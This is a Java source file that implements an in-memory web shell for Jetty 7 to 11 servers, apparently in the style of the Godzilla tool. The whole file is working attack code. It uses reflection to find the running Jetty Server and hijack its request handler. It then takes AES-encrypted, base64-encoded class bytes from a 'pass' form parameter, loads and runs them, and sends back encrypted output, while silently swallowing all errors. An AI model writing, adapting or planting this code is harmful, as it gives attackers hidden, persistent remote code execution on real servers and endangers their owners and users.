import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;

//jetty7-11 test
public class AesBase64JettyHandleShell extends ClassLoader implements InvocationHandler {
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private static Class payloadClass;
    private String key = "3c6e0b8a9c15224a";
    private String password = "pass";
    private Object oldHandler;


    static {
        new AesBase64JettyHandleShell();
    }

    public AesBase64JettyHandleShell(ClassLoader loader) {
        super(loader);
    }

    public AesBase64JettyHandleShell() {
        synchronized (lock) {
            if (!initialized) {
                initialized = true;
                try {
                    Class jettyHandlerClass = null;
                    try {
                        jettyHandlerClass = loadClasses("org.eclipse.jetty.server.Handler");
                    } catch (Exception e) {
                    }
                    if (jettyHandlerClass != null) {
                        addHandler(Proxy.newProxyInstance(jettyHandlerClass.getClassLoader(), new Class[]{jettyHandlerClass}, this));
                    }
                } catch (Throwable e) {

                }
            }
        }
    }

    private Class loadClasses(String className) throws ClassNotFoundException {
        ArrayList classLoaders = new ArrayList();
        classLoaders.add(this.getClass().getClassLoader());
        try {
            classLoaders.add(Thread.currentThread().getContextClassLoader());
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            int threadCount = threadGroup.activeCount();
            Thread[] threads = new Thread[threadCount];
            threadCount = threadGroup.enumerate(threads);
            for (int i = 0; i < threadCount; i++) {
                classLoaders.add(threads[i].getContextClassLoader());
            }
        } catch (Exception e) {

        }
        int loaders = classLoaders.size();
        for (int i = 0; i < loaders; i++) {
            ClassLoader loader = (ClassLoader) classLoaders.get(i);
            if (loader != null) {
                try {
                    return Class.forName(className, true, loader);
                } catch (Throwable e) {

                }
            }
        }
        return Class.forName(className);
    }


    private static Object getJettyServer() throws Throwable {
        HashSet blackType = new HashSet();
        blackType.add(int.class.getName());
        blackType.add(short.class.getName());
        blackType.add(long.class.getName());
        blackType.add(double.class.getName());
        blackType.add(byte.class.getName());
        blackType.add(float.class.getName());
        blackType.add(char.class.getName());
        blackType.add(boolean.class.getName());
        blackType.add(Integer.class.getName());
        blackType.add(Short.class.getName());
        blackType.add(Long.class.getName());
        blackType.add(Double.class.getName());
        blackType.add(Byte.class.getName());
        blackType.add(Float.class.getName());
        blackType.add(Character.class.getName());
        blackType.add(Boolean.class.getName());
        blackType.add(String.class.getName());
        Object jettyServer = searchObject("org.eclipse.jetty.server.Server", Thread.currentThread(), new HashSet(), blackType, 20, 0);
        return jettyServer;
    }

    private static Object searchObject(String targetClassName, Object object, HashSet blacklist, HashSet blackType, int maxDepth, int currentDepth) throws Throwable {
        currentDepth++;

        if (currentDepth >= maxDepth) {
            return null;
        }

        if (object != null) {

            if (targetClassName.equals(object.getClass().getName())) {
                return object;
            }

            Integer hash = System.identityHashCode(object);
            if (!blacklist.contains(hash)) {
                blacklist.add(new Integer(hash));
                Field[] fields = null;
                ArrayList fieldsArray = new ArrayList();
                Class objClass = object.getClass();
                while (objClass != null) {
                    Field[] fields1 = objClass.getDeclaredFields();
                    fieldsArray.addAll(Arrays.asList(fields1));
                    objClass = objClass.getSuperclass();
                }
                fields = (Field[]) fieldsArray.toArray(new Field[0]);


                for (int i = 0; i < fields.length; i++) {
                    Field field = fields[i];

                    try {
                        field.setAccessible(true);
                        Class fieldType = field.getType();
                        if (!blackType.contains(fieldType.getName())) {
                            Object fieldValue = field.get(object);
                            if (fieldValue != null) {
                                Object ret = null;
                                if (fieldType.isArray()) {
                                    if (!blackType.contains(fieldType.getComponentType().getName())) {
                                        int arraySize = Array.getLength(fieldValue);
                                        for (int j = 0; j < arraySize; j++) {
                                            ret = searchObject(targetClassName, Array.get(fieldValue, j), blacklist, blackType, maxDepth, currentDepth);
                                            if (ret != null) {
                                                break;
                                            }
                                        }
                                    }
                                } else {
                                    ret = searchObject(targetClassName, fieldValue, blacklist, blackType, maxDepth, currentDepth);
                                }
                                if (ret != null) {
                                    return ret;
                                }
                            }
                        }
                    } catch (Throwable e) {

                    }
                }
            }
        }
        return null;

    }

    private boolean addHandler(Object newHandler) {
        boolean isOk = false;
        try {
            Object jettyServer = getJettyServer();
            if (jettyServer != null) {
                Field _handlerField = getField(jettyServer, "_handler");
                _handlerField.setAccessible(true);
                this.oldHandler = _handlerField.get(jettyServer);
                _handlerField.set(jettyServer, newHandler);
                isOk = true;
            }
        } catch (Throwable e) {

        }


        return isOk;
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        boolean next = true;
        if (method.getName().equals("handle")) {
            try {
                Object baseRequest = args[1];
                Object servletRequest = args[2];
                Object servletResponse = args[3];
                if (run(servletRequest, servletResponse)) {
                    Method setHandledMethod = getMethodByClass(baseRequest.getClass(), "setHandled", boolean.class);
                    if (setHandledMethod != null) {
                        setHandledMethod.setAccessible(true);
                        setHandledMethod.invoke(baseRequest, true);
                    }
                    next = false;
                }
            } catch (Throwable ignored) {

            }
        }

        if (next && oldHandler != null) {
            return method.invoke(oldHandler, args);
        }

        return null;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; i++) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }
            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        } catch (Exception e) {
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }

        if (method!=null){
            try {
                method.setAccessible(true);
            }catch (Throwable e){

            }
        }

        return method;
    }

    private static Field getField(Object obj, String fieldName) {
        Class clazz = null;

        if (obj == null) {
            return null;
        }

        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null) {
            field.setAccessible(true);
        }

        return field;
    }

    private String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    private String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }


    private byte[] aes(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    private static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    private static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private boolean run(Object request, Object response) {
        try {
            try {
                String contentType = getContentType(request);
                if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
                    String value = getParameter(request, password);
                    if (value != null) {
                        byte[] data = base64Decode(value);
                        data = aes(data, false);
                        if (data != null && data.length > 0) {
                            if (payloadClass == null) {
                                ClassLoader loader = Thread.currentThread().getContextClassLoader();
                                if (loader == null) {
                                    loader = request.getClass().getClassLoader();
                                }

                                payloadClass = new AesBase64JettyHandleShell(loader).defineClass(data, 0, data.length);
                            } else {
                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                Object f = payloadClass.newInstance();
                                f.equals(arrOut);
                                f.equals(request);
                                f.equals(data);
                                f.toString();
                                String md5 = md5(password + key);
                                if (arrOut.size() > 0) {
                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
                                    printWriter.write(md5.substring(0, 16));
                                    printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                    printWriter.write(md5.substring(16));
                                    printWriter.flush();
                                    return true;
                                }
                            }
                        }
                    }
                }

            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {

        }
        return false;
    }
}
